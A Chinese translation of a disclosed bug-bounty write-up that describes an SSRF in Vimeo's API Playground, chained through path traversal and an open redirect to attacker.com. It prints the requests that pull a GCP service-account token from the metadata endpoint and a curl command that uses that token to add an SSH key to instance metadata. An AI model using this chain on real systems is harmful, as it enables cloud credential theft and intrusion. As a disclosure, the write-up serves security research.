# Vimeo SSRF 与代码执行潜力。

> 原文：<https://infosecwriteups.com/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e?source=collection_archive---------0----------------------->

最近我在 Vimeo 上发现了一个半响应的 SSRF，具有代码执行的可能性。这篇博文解释了我是如何发现并利用它的。所以让我们开始吧。

## **背景。**

Vimeo 为他们的 API 提供了一个名为 [API Playground](https://developer.vimeo.com/api/reference) 的 API 控制台，使用这个 web 应用发出的请求是从服务器端完成的。以贝娄请求为例。

![](img/7cb997443eb8928bda2b5354d361b3a2.png)

基本请求

这个请求应该向服务器端发出 GET 请求

> **https://api.vimeo.com/users/{user_id}/videos/{video_id}**

如果你仔细观察请求，你会发现我们在这里控制了很多东西，首先是`**uri**` 参数，它是要在端点上命中的端点，即在本例中是`**/users/{user_id}/videos/{video_id}**`，请求方法，即在本例中被设置为`**GET**` ，如果请求方法是 post，这些参数应该是 POST 参数。user_id & video_id 是一种变量，其值在`**segments**` 参数中定义。

## **服务器端 HTTP 请求中的路径遍历。**

我首先尝试将 URI 参数更改为我的自定义路径，但是 URI 的任何更改都会导致 403，这意味着他们允许一组 API 端点。然而，改变诸如 user_id & videos_id 这样的变量的值是可能的，因为它们是有意的，并且因为这些值反映在 URL 的路径中。传递`**../../../**` 会导致请求到`**api.vimeo.com**`
的根下面是什么情况。

> `**URL.parse(“https://api.vimeo.com/users/1122/videos/../../../attacker”)**`

结果:[**https://api.vimeo.com/attacker**](https://api.vimeo.com/attacker)

![](img/94f08b1aad3afea412855eca26879e91.png)

服务器端 HTTP 请求中的路径遍历

如您所见，在响应中列出了`**api.vimeo.com**`的所有端点，这是`**api.vimeo.com**`的根响应，如果您发出认证请求(带有授权头)。

## **现在怎么办？我们还在** `**api.vimeo.com**` **主机上，我们怎么逃呢？**

嗯，我认为这是遵循 HTTP 30X 重定向，这是一个很长的故事需要一点逻辑思维。

回到正题，现在我知道这是遵循 HTTP 重定向，我们很好地前进，我们需要一个开放的重定向，以便我们可以将服务器重定向到我们的受控资产。

## **优秀的旧内容发现…**

一分钟的内容发现，我在`api.vimeo.com`上遇到一个端点，它通过`vimeo.com`上的受控路径重定向到`vimeo.com`

> **https://api.vimeo.com/m/something**

![](img/e12f16b3391c7a2ab14723152871f23d.png)

api.vimeo.com 到 vimeo.com

酷，现在我们有一个很大的范围来寻找一个开放重定向，我在 vimeo.com 有一个不太有用的开放重定向，我不会透露它的细节，但让我们假设它是这样的

> [https://vimeo/vulnerable/open/redirect？URL = https://attack . com](https://vimeo/vulnerable/open/redirect?url=https://attacker.com)

这使得 302 号公路转向 attacker.com，

## **链已完成，可重定向至攻击者资产..**

将服务器重定向到我们的受控资产的最终有效负载是

> ../../../m/易受攻击/打开/重定向？URL = https://attack . com

在 video_id 内部传递这个值将会以这种方式解析 URL

> https://api.vimeo.com/users/1122/videos/../../../m/易受攻击/打开/重定向？URL = https://attack . com

解析后变成了

> [https://api.vimeo.com/m/vulnerable/open/redirect?URL = https://attack . com](https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com)

进行 HTTP 重定向并跟踪至

> [https://vimeo.com/vulnerable/open/redirect?URL = https://attack . com](https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com)

进行了另一次 HTTP 重定向并跟踪到

> [https://attacker.com](https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com)

![](img/41c67ab1fb841379838d1be52e01aae1.png)

SSRF 实现，编辑关于开放重定向和我的域的细节。

服务器期待一个 JSON 响应，解析它并在响应中显示。

## **剥削..**

由于 Vimeo 基础设施在 Google cloud 上，我的第一个尝试是使用 Google metadata API。我采用了安德烈·巴普蒂斯塔的方法

此端点为我们提供服务帐户令牌。

> [**http://metadata . Google . internal/computeMetadata/v1 beta 1/instance/service-accounts/default/token**](http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?fbclid=IwAR1EUeeTJhWLwfOb1-JXW1AF13QfJNXTBnuF7X1Uj1iXZ9FVjKz-F1U-CEY)**？alt=json**

```
{ “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } }
```

**令牌范围**

```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA Response:{ "issued_to": "101302079XXXXX", "audience": "10130207XXXXX", "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", "expires_in": 2443, "access_type": "offline" }
```

然后，我可以使用这个令牌将我的公共 SSH 密钥添加到实例中，然后通过我的私有密钥进行连接

```
$ curl -X POST “https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" -H “Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]} Response: { “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX"}
```

还有…

![](img/bd5f173a34c77bb0ec05a222735404d3.png)

添加了密钥

![](img/b1c65d4f4aa510f5d8dd74e0ee9c4bf8.png)

*放开我

然而，SSH 端口只在内部网络上开放:((但这足以证明在内部这可以升级到 shell 访问。

Kubernetes 密钥也是从元数据 API 中提取的，但是由于某种原因，我无法使用它们，尽管 Vimeo 团队确认它们是有效的。

***由于我的工作&涉及 Vimeo，我被允许比正常情况下更深入地研究。***

就这样了，伙计们。我希望你喜欢这个。非常感谢分享/转发，对此有任何问题吗？DM @ [rootxharsh](https://twitter.com/rootxharsh)

## **感谢；**

**Vimeo 团队**允许披露此问题。

[**安德烈(0xacb)**](https://twitter.com/0xACB) 为他的[牛逼的报告](https://hackerone.com/reports/341876)

[**布雷特(bbuerhaus)**](https://twitter.com/bbuerhaus) 为他写起了关于[这个 SSRF](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/) (他和[本](https://twitter.com/NahamSec)都有一些点燃的 AF 写起)

## 时间表

1 月 28 日清晨:初步发现。

1 月 28 日:由 HackerOne 团队进行分类

1 月 28 日:Vimeo 团队奖励了最初的 100 美元，并推出了一个临时补丁。

1 月 30 日/31 日:推出永久修复

2 月 1 日:奖励 4900 美元。